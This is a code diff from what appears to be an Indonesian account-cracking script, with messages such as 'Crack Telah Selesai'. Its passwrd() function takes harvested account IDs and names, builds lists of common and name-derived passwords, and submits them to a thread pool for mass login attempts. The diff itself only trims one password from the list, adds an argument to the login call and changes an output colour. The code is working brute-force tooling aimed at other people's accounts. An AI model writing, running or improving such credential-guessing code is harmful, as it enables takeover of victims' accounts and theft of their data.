@@ -1051,7 +1051,7 @@ def passwrd():
             for yuzong in id2:
                 idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                 frs = nmf.split(" ")[0]
-                pwv = ['anjing123','bangsad123','sayangku','maling123','sayang123','malang123','bismillah123']
+                pwv = ['anjing123','sayangku','maling123','sayang123','malang123','bismillah123']
                 if len(nmf)<6:
                     if len(frs)<3:
                         pass
@@ -1078,7 +1078,7 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(reguler,idf,pwv)
+                pool.submit(reguler,idf,pwv,awal)
                 
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1088,10 +1088,9 @@ def passwrd():
     if li in ['Y','y']:
         back()
     else:
-        Console().print(f"[bold green]	\n[bold green]God Bye Kawan")
+        Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
         time.sleep(1)
         exit()
-
 
 #--------------------[ METODE-MOBILE ]-----------------#
     
